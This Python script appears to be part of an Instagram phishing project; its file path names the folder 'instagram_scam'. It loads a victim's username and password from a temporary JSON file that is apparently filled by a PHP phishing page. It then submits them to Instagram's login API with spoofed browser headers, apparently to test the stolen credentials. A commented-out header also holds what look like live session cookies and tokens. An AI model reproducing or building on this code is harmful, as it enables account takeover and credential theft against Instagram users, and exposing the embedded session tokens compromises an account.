import requests
import json
import datetime

with open('C:/xampp/htdocs/instagram_scam/instagram_scam/php/login_tmp.json','r') as file:   
   login = json.load(file) 

username = login['username']
password = login['password']
time = str(int(datetime.datetime.now().timestamp()))

headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mid=ZPhJZQALAAE97Y67SouiG32ryQXG; ig_did=107EDBCD-1AEB-4B30-933E-0716E633B55F; datr=oacCZZDs4ZsZdILz6yhDyNgO; csrftoken=ndrHP6dJJZGjtTar5jCJY89ldM7m3pNw; ds_user_id=7225109200; shbid="10277\\0547225109200\\0541726313825:01f7a5b897fbd3e4588e5ad8115888abeabb90234c68b9c03f1997ef9ee69a2c46fd7dc6"; shbts="1694777825\\0547225109200\\0541726313825:01f7a868b42393ed63072a1a150990ece52abac88c0cae4287d3283599ec70a39ace8f91"; sessionid=7225109200%3A6b34AFaraOFQtE%3A10%3AAYcGDV64psCH4U7Y4TGwIL21qOjThJJJmDqgM6iMqA; rur="RVA\\0547225109200\\0541726560708:01f7473aba6b48d32b86a6466aa1c69c824b53d15bae1d05e92f2547691cf7995840dcb3"',
    'dpr': '1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-full-version-list': '"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'viewport-width': '553',
    'x-asbd-id': '129477',
    'x-csrftoken': 'ndrHP6dJJZGjtTar5jCJY89ldM7m3pNw',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR2nVHEyniKL_iDQUTx4aUwv2jwEhviQe-1InCaP6w0wZxWE',
    'x-instagram-ajax': '1008688753',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:'+time+':'+ password,
    'optIntoOneTap': 'false',
    'queryParams': '{}',
    'trustedDeviceRecords': '{}',
    'username': username,
}

response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
print(response.text)